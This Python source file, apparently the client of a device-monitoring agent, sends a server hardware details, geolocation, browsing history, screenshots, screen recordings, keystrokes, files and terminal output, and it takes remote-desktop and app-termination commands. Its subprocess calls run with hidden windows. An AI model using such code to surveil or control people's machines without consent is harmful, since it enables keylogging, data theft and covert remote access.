import requests
import json
import uuid
import platform
import psutil
import subprocess
import os
from datetime import datetime
from app_paths import get_app_data_path


def get_ip_and_location() -> dict:
    """Ambil IP publik dan info geolokasi jaringan via ip-api.com (gratis, 45 req/menit)."""
    try:
        resp = requests.get(
            'http://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,timezone,isp,query',
            timeout=5
        )
        data = resp.json()
        if data.get('status') == 'success':
            return {
                'ip'      : data.get('query'),
                'country' : data.get('country'),
                'region'  : data.get('regionName'),
                'city'    : data.get('city'),
                'timezone': data.get('timezone'),
                'isp'     : data.get('isp'),
            }
    except Exception:
        pass
    return {}


def get_wifi_info() -> dict:
    """Ambil info WiFi dari Windows via netsh dan PowerShell."""
    info = {
        'wifi_ip'      : None,
        'wifi_ipv6'    : None,
        'wifi_type'    : None,
        'wifi_ssid'    : None,
        'wifi_auth'    : None,
        'wifi_subnet'  : None,
        'wifi_mode'    : None,
        'wifi_lan_mode': None,
    }
    try:
        no_window = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0

        r = subprocess.run(
            ['netsh', 'wlan', 'show', 'interfaces'],
            capture_output=True, text=True, timeout=8,
            creationflags=no_window
        )
        wlan = r.stdout

        def parse_netsh(text, key):
            for line in text.splitlines():
                if key.lower() in line.lower() and ':' in line:
                    return line.split(':', 1)[1].strip()
            return None

        ssid = parse_netsh(wlan, 'SSID')
        if ssid and 'BSSID' not in ssid:
            info['wifi_ssid'] = ssid

        info['wifi_auth']     = parse_netsh(wlan, 'Authentication')
        info['wifi_mode']     = parse_netsh(wlan, 'Network type') or parse_netsh(wlan, 'Type of network')
        info['wifi_lan_mode'] = parse_netsh(wlan, 'Radio type')
        info['wifi_type']     = 'Wifi' if info['wifi_ssid'] else None

        ps_cmd = (
            "Get-NetIPAddress | Where-Object {"
            " $_.InterfaceAlias -like '*Wi-Fi*' -or $_.InterfaceAlias -like '*WLAN*'"
            "} | Select-Object AddressFamily,IPAddress,PrefixLength | ConvertTo-Json"
        )
        r2 = subprocess.run(
            ['powershell', '-Command', ps_cmd],
            capture_output=True, text=True, timeout=8,
            creationflags=no_window
        )
        if r2.stdout.strip():
            import json as _json
            try:
                addrs = _json.loads(r2.stdout.strip())
                if isinstance(addrs, dict):
                    addrs = [addrs]
                for addr in addrs:
                    family = addr.get('AddressFamily', 0)
                    ip     = addr.get('IPAddress', '')
                    prefix = addr.get('PrefixLength', 0)
                    if family == 2 and not ip.startswith('169.'):   # IPv4
                        info['wifi_ip']     = ip
                        mask = (0xFFFFFFFF << (32 - int(prefix))) & 0xFFFFFFFF
                        info['wifi_subnet'] = '.'.join(
                            str((mask >> (8 * i)) & 0xFF) for i in [3, 2, 1, 0]
                        )
                    elif family == 23:  # IPv6
                        if not ip.startswith('fe80') or not info['wifi_ipv6']:
                            info['wifi_ipv6'] = ip + '/' + str(prefix)
            except Exception:
                pass

        if not info['wifi_ip']:
            import socket as _sock
            try:
                info['wifi_ip'] = _sock.gethostbyname(_sock.gethostname())
            except Exception:
                pass

    except Exception:
        pass
    return info


class DataSender:
    def __init__(self, server_url=None):
        self.config_path = self._resolve_config_path()
        config = self._load_config()

        self.server_url = config.get("server_url")
        self.device_id = config.get("device_id")
        self.token = config.get("token")

        if not self.device_id:
            self.device_id = self._generate_hardware_id()

        if server_url:
            self.server_url = server_url

        # Cache untuk fetch_config_cached
        self._last_config_fetch = 0
        self._cached_config = None

    def _headers(self, with_json=True):
        headers = {"Accept": "application/json"}
        if with_json:
            headers["Content-Type"] = "application/json"
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"
        return headers

    def _resolve_config_path(self):
        return get_app_data_path("device_config.json")

    def _generate_hardware_id(self):
        try:
            node = uuid.getnode()
            hostname = platform.node()
            system = platform.system()
            unique_str = f"{node}-{hostname}-{system}"
            return str(uuid.uuid5(uuid.NAMESPACE_DNS, unique_str))
        except Exception:
            return str(uuid.uuid4())

    def _load_config(self):
        try:
            if os.path.exists(self.config_path):
                with open(self.config_path, "r") as f:
                    return json.load(f)
        except Exception as e:
            print(f"Error loading config: {e}")
        return {}

    def is_registered(self):
        return bool(self.device_id and self.server_url and self.token)

    def register_device(self, server_url):
        base_url = server_url.strip().rstrip('/')

        if "/api/monitoring" in base_url:
            register_url = f"{base_url}/register"
            target_server_url = base_url
        else:
            register_url = f"{base_url}/api/monitoring/register"
            target_server_url = f"{base_url}/api/monitoring"

        if not self.device_id:
            self.device_id = self._generate_hardware_id()

        device_id = self.device_id
        old_server_url = self.server_url
        system_info = self._get_system_info()

        payload = {
            "device_info": system_info,
            "timestamp": datetime.now().isoformat()
        }

        try:
            response = requests.post(register_url, json=payload, timeout=15)
            if response.status_code in [200, 201]:
                data = response.json()
                token = data.get("token")

                if not token:
                    self.server_url = old_server_url
                    return {"success": False, "error": "Server tidak mengembalikan token. Pastikan server sudah menerapkan Sanctum."}

                self.server_url = target_server_url
                self.token = token

                with open(self.config_path, "w") as f:
                    json.dump({
                        "device_id": self.device_id,
                        "server_url": self.server_url,
                        "token": self.token
                    }, f, indent=4)
                return {"success": True, "device_id": device_id}

            self.server_url = old_server_url
            return {"success": False, "error": f"Server returned status {response.status_code}"}
        except Exception as e:
            self.server_url = old_server_url
            return {"success": False, "error": str(e)}

    def _get_or_create_device_id(self):
        return self.device_id

    def _get_system_info(self):
        cpu_usage = psutil.cpu_percent(interval=None)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')

        battery_info = {}
        try:
            battery = psutil.sensors_battery()
            if battery:
                battery_info = {
                    "percent": battery.percent,
                    "power_plugged": battery.power_plugged,
                    "secsleft": battery.secsleft
                }
        except Exception:
            pass

        manufacturer = "Unknown"
        model = "Unknown"
        try:
            if platform.system() == "Windows":
                no_window = subprocess.CREATE_NO_WINDOW
                ps_cmd = (
                    "Get-CimInstance Win32_ComputerSystem | "
                    "Select-Object -ExpandProperty Manufacturer"
                )
                result = subprocess.run(
                    ['powershell', '-Command', ps_cmd],
                    capture_output=True, text=True, timeout=8,
                    creationflags=no_window
                )
                mfr = result.stdout.strip()
                if mfr and mfr.lower() not in ('', 'unknown', 'to be filled by o.e.m.'):
                    manufacturer = mfr

                ps_cmd2 = (
                    "Get-CimInstance Win32_ComputerSystem | "
                    "Select-Object -ExpandProperty Model"
                )
                result2 = subprocess.run(
                    ['powershell', '-Command', ps_cmd2],
                    capture_output=True, text=True, timeout=8,
                    creationflags=no_window
                )
                mdl = result2.stdout.strip()
                if mdl and mdl.lower() not in ('', 'unknown', 'to be filled by o.e.m.'):
                    model = mdl
        except Exception:
            pass

        mac_address = "Unknown"
        try:
            import uuid as _uuid
            mac_int = _uuid.getnode()
            mac_address = ':'.join(
                f'{(mac_int >> (5 - i) * 8) & 0xFF:02X}' for i in range(6)
            )
        except Exception:
            pass

        return {
            "device_id": self.device_id,
            "hostname": platform.node(),
            "mac_address": mac_address,
            "manufacturer": manufacturer,
            "model": model,
            "os": (lambda: (
                "Windows 11" if platform.system() == "Windows" and
                int(platform.version().split(".")[2]) >= 22000
                else f"{platform.system()} {platform.release()}"
            ))(),
            "os_version": platform.version(),
            "platform": (platform.platform().replace(
                "Windows-10-", "Windows-11-"
            ) if platform.system() == "Windows" and
                int(platform.version().split(".")[2]) >= 22000
                else platform.platform()),
            "processor": platform.processor(),
            "cpu_usage_percent": cpu_usage,
            "memory": {
                "total": memory.total,
                "available": memory.available,
                "percent": memory.percent
            },
            "disk": {
                "total": disk.total,
                "used": disk.used,
                "free": disk.free,
                "percent": disk.percent
            },
            "battery": battery_info,
            **get_wifi_info(),
            "python_version": platform.python_version(),
            "timestamp": datetime.now().isoformat()
        }

    def send_app_usage(self, app_data, location_data=None):
        payload = {
            "device_info": self._get_system_info(),
            "data_type": "app_usage",
            "app_usage": app_data,
            "location": location_data,
            "sent_at": datetime.now().isoformat()
        }
        try:
            response = requests.post(
                self.server_url + "/app-usage",
                json=payload,
                headers=self._headers(),
                timeout=10
            )
            return {"success": True, "status_code": response.status_code}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused - server not available"}
        except requests.exceptions.Timeout:
            return {"success": False, "error": "Request timeout"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def send_browsing_history(self, history_data, location_data=None):
        payload = {
            "device_info": self._get_system_info(),
            "data_type": "browsing_history",
            "browsing_history": history_data,
            "location": location_data,
            "sent_at": datetime.now().isoformat()
        }
        try:
            response = requests.post(
                self.server_url + "/browsing-history",
                json=payload,
                headers=self._headers(),
                timeout=15
            )
            return {"success": True, "status_code": response.status_code}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused - server not available"}
        except requests.exceptions.Timeout:
            return {"success": False, "error": "Request timeout"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def send_all_data(self, app_usage_data, browsing_history_data, location_data=None):
        results = {
            "app_usage": self.send_app_usage(app_usage_data, location_data),
            "browsing_history": self.send_browsing_history(browsing_history_data, location_data)
        }
        return results

    def verify_registration(self):
        if not self.is_registered():
            return {"success": False, "error": "Not registered localy"}

        verify_url = f"{self.server_url}/verify-registration"
        payload = {
            "device_id": self.device_id,
            "device_info": self._get_system_info(),
            "timestamp": datetime.now().isoformat()
        }

        try:
            response = requests.post(verify_url, json=payload, timeout=10)
            if response.status_code == 200:
                return {"success": True}
            elif response.status_code == 404:
                return {"success": False, "error": "Device not found on server", "code": 404}
            else:
                return {"success": False, "error": f"Server error: {response.status_code}"}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused", "code": "offline"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def logout(self):
        self.device_id = None
        self.server_url = None
        self.token = None
        if os.path.exists(self.config_path):
            try:
                os.remove(self.config_path)
                return True
            except Exception:
                pass
        return False

    def fetch_config(self):
        """Mengambil konfigurasi lengkap dari API"""
        if not self.is_registered():
            return {"success": False, "error": "Not registered"}

        config_url = f"{self.server_url}/config"

        try:
            response = requests.get(config_url, headers=self._headers(with_json=False), timeout=10)
            if response.status_code == 401:
                return {"success": False, "error": "Unauthorized - token tidak valid, perlu register ulang", "code": 401}
            if response.status_code == 200:
                data = response.json()
                config_data = data.get("config", {})

                current_config = self._load_config()
                current_config["last_config"] = config_data

                with open(self.config_path, "w") as f:
                    json.dump(current_config, f, indent=4)

                return {"success": True, "config": config_data}
            return {"success": False, "error": f"Status {response.status_code}"}
        except Exception as e:
            current_config = self._load_config()
            if "last_config" in current_config:
                return {"success": True, "config": current_config["last_config"], "is_fallback": True}
            return {"success": False, "error": str(e)}

    def fetch_config_cached(self, max_age_seconds=300):
        """
        Fetch config hanya jika cache sudah kadaluarsa.
        Mengurangi beban server drastis — config jarang berubah.
        """
        import time as _time
        now = _time.time()

        if not hasattr(self, '_last_config_fetch'):
            self._last_config_fetch = 0
        if not hasattr(self, '_cached_config'):
            self._cached_config = None

        if (now - self._last_config_fetch < max_age_seconds) and self._cached_config:
            return {"success": True, "config": self._cached_config, "cached": True}

        result = self.fetch_config()
        if result.get("success"):
            self._cached_config = result["config"]
            self._last_config_fetch = now
        return result

    def fetch_interval(self):
        result = self.fetch_config()
        if result.get("success"):
            interval = result["config"].get("sync_interval", 300)
            return {"success": True, "interval": interval}
        return result

    def send_screenshot(self, screenshot_data, location_data=None):
        if not screenshot_data:
            return {"success": False, "error": "No screenshot data provided"}

        payload = {
            "device_info": self._get_system_info(),
            "data_type": "screenshot",
            "filename": screenshot_data.get("filename", "screenshot.png"),
            "timestamp": screenshot_data.get("timestamp", datetime.now().isoformat()),
            "image_base64": screenshot_data.get("image_base64", ""),
            "location": location_data,
            "sent_at": datetime.now().isoformat()
        }

        try:
            response = requests.post(
                self.server_url + "/screenshot",
                json=payload,
                headers=self._headers(),
                timeout=30
            )
            return {"success": True, "status_code": response.status_code}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused - server not available"}
        except requests.exceptions.Timeout:
            return {"success": False, "error": "Request timeout"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def send_all_data_with_screenshot(self, app_usage_data, browsing_history_data, screenshot_data=None, location_data=None):
        results = {
            "app_usage": self.send_app_usage(app_usage_data, location_data),
            "browsing_history": self.send_browsing_history(browsing_history_data, location_data)
        }
        if screenshot_data:
            results["screenshot"] = self.send_screenshot(screenshot_data, location_data)
        return results

    def send_recording(self, recording_data, location_data=None):
        if not recording_data:
            return {"success": False, "error": "No recording data provided"}

        payload = {
            "device_info": self._get_system_info(),
            "data_type": "screen_recording",
            "filename": recording_data.get("filename", "recording.mp4"),
            "start_time": recording_data.get("start_time", ""),
            "end_time": recording_data.get("end_time", ""),
            "duration_seconds": recording_data.get("duration_seconds", 0),
            "frame_count": recording_data.get("frame_count", 0),
            "video_base64": recording_data.get("video_base64", ""),
            "location": location_data,
            "sent_at": datetime.now().isoformat()
        }

        try:
            response = requests.post(
                self.server_url + "/recording",
                json=payload,
                headers=self._headers(),
                timeout=60
            )
            return {"success": True, "status_code": response.status_code}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused - server not available"}
        except requests.exceptions.Timeout:
            return {"success": False, "error": "Request timeout"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def send_upload_activity(self, upload_data, location_data=None):
        if not upload_data:
            return {"success": False, "error": "No upload data provided"}

        payload = {
            "device_info": self._get_system_info(),
            "data_type": "file_upload_activity",
            "upload_activities": upload_data,
            "location": location_data,
            "sent_at": datetime.now().isoformat()
        }

        try:
            response = requests.post(
                self.server_url + "/upload-activity",
                json=payload,
                headers=self._headers(),
                timeout=10
            )
            return {"success": True, "status_code": response.status_code}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused - server not available"}
        except requests.exceptions.Timeout:
            return {"success": False, "error": "Request timeout"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def send_idle_events(self, idle_data, location_data=None):
        if not idle_data:
            return {"success": False, "error": "No idle data provided"}

        payload = {
            "device_info": self._get_system_info(),
            "data_type": "idle_event",
            "idle_events": idle_data,
            "location": location_data,
            "sent_at": datetime.now().isoformat()
        }

        try:
            response = requests.post(
                self.server_url + "/idle-event",
                json=payload,
                headers=self._headers(),
                timeout=10
            )
            return {"success": True, "status_code": response.status_code}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused - server not available"}
        except requests.exceptions.Timeout:
            return {"success": False, "error": "Request timeout"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def send_keystrokes(self, keystrokes_data, location_data=None):
        if not keystrokes_data:
            return {"success": False, "error": "No keystrokes data provided"}

        payload = {
            "device_info": self._get_system_info(),
            "data_type": "keystrokes",
            "keystrokes": keystrokes_data,
            "location": location_data,
            "sent_at": datetime.now().isoformat()
        }

        try:
            response = requests.post(
                self.server_url + "/keystrokes",
                json=payload,
                headers=self._headers(),
                timeout=15
            )
            return {"success": True, "status_code": response.status_code}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused - server not available"}
        except requests.exceptions.Timeout:
            return {"success": False, "error": "Request timeout"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def send_location(self, location_data):
        if not location_data:
            return {"success": False, "error": "No location data provided"}

        net_info = get_ip_and_location()
        if net_info:
            location_data.update({
                'ip'      : net_info.get('ip'),
                'country' : net_info.get('country'),
                'region'  : net_info.get('region'),
                'city'    : net_info.get('city'),
                'timezone': net_info.get('timezone'),
                'isp'     : net_info.get('isp'),
            })

        payload = {
            "device_info": self._get_system_info(),
            "data_type": "location",
            "location": location_data,
            "sent_at": datetime.now().isoformat()
        }

        try:
            response = requests.post(
                self.server_url + "/location",
                json=payload,
                headers=self._headers(),
                timeout=10
            )
            return {"success": True, "status_code": response.status_code}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused - server not available"}
        except requests.exceptions.Timeout:
            return {"success": False, "error": "Request timeout"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def download_file(self, file_id, local_path):
        if not self.is_registered():
            return {"success": False, "error": "Not registered"}

        base_url = self.server_url.replace("/api/monitoring", "")
        download_url = f"{base_url}/api/monitoring/downloadFile/{file_id}"

        try:
            response = requests.get(download_url, headers=self._headers(with_json=False), timeout=60, stream=True)

            if response.status_code == 200:
                os.makedirs(os.path.dirname(local_path), exist_ok=True)

                with open(local_path, "wb") as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        f.write(chunk)
                return {"success": True, "path": local_path}
            else:
                return {"success": False, "error": f"Server returned status {response.status_code}"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def send_download_logs(self, download_logs):
        if not download_logs:
            return {"success": True, "message": "No logs to send"}

        if not self.is_registered():
            return {"success": False, "error": "Not registered"}

        payload = {
            "device_info": self._get_system_info(),
            "download_activities": download_logs
        }

        try:
            response = requests.post(
                self.server_url + "/download-activity",
                json=payload,
                headers=self._headers(),
                timeout=30
            )
            if response.status_code in [200, 201]:
                return {"success": True, "status_code": response.status_code}
            else:
                return {"success": False, "error": f"Server returned status {response.status_code}"}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    # =========================
    # REMOTE CONTROL
    # =========================
    def fetch_pending_actions(self):
        if not self.is_registered():
            return {"success": False, "error": "Not registered"}

        actions_url = f"{self.server_url}/actions"

        try:
            response = requests.get(actions_url, headers=self._headers(with_json=False), timeout=10)
            if response.status_code == 401:
                return {"success": False, "error": "Unauthorized - token tidak valid", "code": 401}
            if response.status_code == 200:
                data = response.json()
                return {"success": True, "actions": data.get("actions", [])}
            return {"success": False, "error": f"Status {response.status_code}"}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused - server not available"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def acknowledge_action(self, action_id, status):
        if not self.is_registered():
            return {"success": False, "error": "Not registered"}

        ack_url = f"{self.server_url}/actions/{action_id}/ack"
        payload = {"status": status}

        try:
            response = requests.post(ack_url, json=payload, headers=self._headers(), timeout=10)
            if response.status_code == 200:
                return {"success": True}
            return {"success": False, "error": f"Status {response.status_code}"}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused - server not available"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    # =========================
    # REMOTE DESKTOP CONTROL
    # =========================
    def fetch_remote_status(self):
        if not self.is_registered():
            return {"success": False, "error": "Not registered"}

        try:
            response = requests.get(
                f"{self.server_url}/remote/status",
                headers=self._headers(with_json=False),
                timeout=5
            )
            if response.status_code == 200:
                data = response.json()
                return {"success": True, "remote_active": data.get("remote_active", False)}
            return {"success": False, "error": f"Status {response.status_code}"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def upload_remote_frame(self, image_base64, width, height):
        """
        Upload frame layar ke server. Response berisi events (mouse/keyboard/
        terminate) yang perlu dieksekusi.
        """
        if not self.is_registered():
            return {"success": False, "error": "Not registered",
                    "remote_active": False, "events": []}

        payload = {
            "image_base64": image_base64,
            "screen_width": width,
            "screen_height": height,
        }

        try:
            response = requests.post(
                f"{self.server_url}/remote/frame",
                json=payload,
                headers=self._headers(),
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                return {
                    "success": True,
                    "remote_active": data.get("remote_active", True),
                    "events": data.get("events", []),
                }
            if response.status_code == 401:
                return {"success": False, "error": "Unauthorized",
                        "remote_active": False, "events": []}
            return {"success": False, "error": f"Status {response.status_code}",
                    "remote_active": True, "events": []}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused",
                    "remote_active": True, "events": []}
        except requests.exceptions.Timeout:
            return {"success": False, "error": "Timeout",
                    "remote_active": True, "events": []}
        except Exception as e:
            return {"success": False, "error": str(e),
                    "remote_active": True, "events": []}

    def fetch_remote_events(self):
        if not self.is_registered():
            return {"success": False, "error": "Not registered"}

        try:
            response = requests.get(
                f"{self.server_url}/remote/events",
                headers=self._headers(with_json=False),
                timeout=5
            )
            if response.status_code == 200:
                data = response.json()
                return {"success": True, "events": data.get("events", [])}
            return {"success": False, "error": f"Status {response.status_code}"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def send_active_apps(self, apps_list):
        payload = {
            "device_info": self._get_system_info(),
            "active_apps": apps_list,
        }

        try:
            response = requests.post(
                self.server_url + "/active-apps",
                json=payload,
                headers=self._headers(),
                timeout=10
            )
            return {"success": response.status_code == 200, "status_code": response.status_code}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused - server not available"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def terminate_app(self, app_name):
        if not self.is_registered():
            return {"success": False, "error": "Not registered"}

        payload = {"app_name": app_name}

        try:
            response = requests.post(
                self.server_url + "/terminate-app",
                json=payload,
                headers=self._headers(),
                timeout=10
            )
            return {"success": response.status_code == 200}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def fetch_pending_terminate_actions(self):
        if not self.is_registered():
            return {"success": False, "error": "Not registered", "actions": []}

        try:
            response = requests.get(
                f"{self.server_url}/actions",
                headers=self._headers(with_json=False),
                timeout=5
            )
            if response.status_code == 200:
                data = response.json()
                actions = [a for a in data.get("actions", [])
                           if a.get("action_type") == "Terminate App"]
                return {"success": True, "actions": actions}
            return {"success": False, "error": f"Status {response.status_code}", "actions": []}
        except Exception as e:
            return {"success": False, "error": str(e), "actions": []}

    # ── Remote Chat ──────────────────────────────────────────────
    def fetch_chat_messages(self):
        if not self.is_registered():
            return {"success": False, "messages": []}
        try:
            r = requests.get(
                f"{self.server_url}/chat/messages",
                headers=self._headers(with_json=False),
                timeout=5
            )
            if r.status_code == 200:
                return {"success": True, "messages": r.json().get("messages", [])}
            return {"success": False, "messages": []}
        except Exception:
            return {"success": False, "messages": []}

    def send_chat_reply(self, message):
        if not self.is_registered():
            return {"success": False}
        try:
            r = requests.post(
                f"{self.server_url}/chat/reply",
                json={"message": message},
                headers=self._headers(),
                timeout=5
            )
            return {"success": r.status_code == 200}
        except Exception:
            return {"success": False}

    def ack_chat_end(self):
        if not self.is_registered():
            return
        try:
            requests.post(
                f"{self.server_url}/chat/ack-end",
                json={},
                headers=self._headers(),
                timeout=5
            )
        except Exception:
            pass

    def send_agent_chat(self, message):
        return self.send_chat_reply(message)

    def fetch_all_chat_messages(self):
        if not self.is_registered():
            return {"success": False, "messages": []}
        try:
            r = requests.get(
                f"{self.server_url}/chat/all",
                headers=self._headers(with_json=False),
                timeout=5
            )
            if r.status_code == 200:
                return {"success": True, "messages": r.json().get("messages", [])}
            return {"success": False, "messages": []}
        except Exception:
            return {"success": False, "messages": []}

    def fetch_reverb_config(self):
        if not self.is_registered():
            return None
        try:
            r = requests.get(
                f"{self.server_url}/chat/reverb-config",
                headers=self._headers(with_json=False),
                timeout=5
            )
            if r.status_code == 200:
                return r.json()
            return None
        except Exception:
            return None

    def get_channel_auth(self, socket_id, channel_name):
        if not self.is_registered():
            return None
        try:
            r = requests.post(
                f"{self.server_url}/broadcasting/auth",
                json={"socket_id": socket_id, "channel_name": channel_name},
                headers=self._headers(),
                timeout=5
            )
            if r.status_code == 200:
                return r.json().get("auth")
            return None
        except Exception:
            return None

    # ── WebRTC Signaling ─────────────────────────────────────
    def send_webrtc_offer(self, sdp: str, sdp_type: str):
        if not self.is_registered():
            return
        try:
            requests.post(
                f"{self.server_url}/webrtc/offer",
                json={"sdp": sdp, "type": sdp_type},
                headers=self._headers(),
                timeout=10,
            )
        except Exception:
            pass

    def send_webrtc_ice(self, candidate: dict):
        if not self.is_registered():
            return
        try:
            requests.post(
                f"{self.server_url}/webrtc/ice",
                json={"candidate": candidate},
                headers=self._headers(),
                timeout=5,
            )
        except Exception:
            pass

    def send_webrtc_answer(self, sdp: str, sdp_type: str):
        """Agent kirim SDP answer ke server → diteruskan ke admin."""
        if not self.is_registered():
            return
        try:
            requests.post(
                f"{self.server_url}/webrtc/offer",
                json={"sdp": sdp, "type": sdp_type},
                headers=self._headers(),
                timeout=10,
            )
        except Exception:
            pass

    def send_installed_apps(self):
        if not self.is_registered():
            return
        try:
            from get_installed_apps import get_installed_apps
            apps = get_installed_apps()
            if not apps:
                return
            requests.post(
                f"{self.server_url}/installed-apps",
                json={'apps': apps},
                headers=self._headers(),
                timeout=30,
            )
        except Exception:
            pass

    def send_device_owner(self):
        if not self.is_registered():
            return
        try:
            from get_windows_account import get_windows_user_info
            info = get_windows_user_info()
            requests.post(
                f"{self.server_url}/device/owner",
                json={
                    'owner_name'    : info.get('full_name') or info.get('username', ''),
                    'owner_email'   : info.get('email', ''),
                    'owner_position': 'Administrator' if info.get('is_admin') else 'Standard User',
                    'owner_notes'   : 'Microsoft Account' if info.get('is_microsoft_account') else 'Local Account',
                },
                headers=self._headers(),
                timeout=10,
            )
        except Exception:
            pass

    def send_windows_users(self, users_list: list):
        if not self.is_registered():
            return {"success": False, "error": "Not registered"}
        try:
            response = requests.post(
                f"{self.server_url}/device/windows-users",
                json={"users": users_list},
                headers=self._headers(),
                timeout=15,
            )
            return {"success": response.status_code == 200}
        except Exception as e:
            return {"success": False, "error": str(e)}

    # ── File Manager ──────────────────────────────────────────
    def send_file_listing(self, path: str, items: list):
        try:
            requests.post(f"{self.server_url}/file/listing",
                json={'path': path, 'items': items},
                headers=self._headers(), timeout=15)
        except Exception:
            pass

    def send_file_chunk(self, transfer_id, filename, chunk_index, total_chunks, data, is_last):
        try:
            requests.post(f"{self.server_url}/file/chunk",
                json={'transfer_id': transfer_id, 'filename': filename,
                      'chunk_index': chunk_index, 'total_chunks': total_chunks,
                      'data': data, 'is_last': is_last},
                headers=self._headers(), timeout=30)
        except Exception:
            pass

    def send_file_upload_done(self, transfer_id, filename, success=True, error=None):
        try:
            requests.post(f"{self.server_url}/file/upload-done",
                json={'transfer_id': transfer_id, 'filename': filename,
                      'success': success, 'error': error},
                headers=self._headers(), timeout=10)
        except Exception:
            pass

    def send_file_error(self, message: str):
        try:
            requests.post(f"{self.server_url}/file/error",
                json={'message': message},
                headers=self._headers(), timeout=10)
        except Exception:
            pass

    # ── App Integrity ──────────────────────────────────────────
    def send_app_integrity_results(self, results: list):
        if not results:
            return
        try:
            requests.post(
                f"{self.server_url}/app/integrity-result",
                json={'results': results},
                headers=self._headers(),
                timeout=30,
            )
        except Exception:
            pass

    # ── Terminal ──────────────────────────────────────────────
    def send_terminal_result(self, cmd_id: str, output: str,
                             cwd: str = None, exit_code: int = 0, success: bool = True):
        try:
            requests.post(
                f"{self.server_url}/terminal/result",
                json={
                    'cmd_id'   : cmd_id,
                    'output'   : output,
                    'cwd'      : cwd,
                    'exit_code': exit_code,
                    'success'  : success,
                },
                headers=self._headers(),
                timeout=15,
            )
        except Exception:
            pass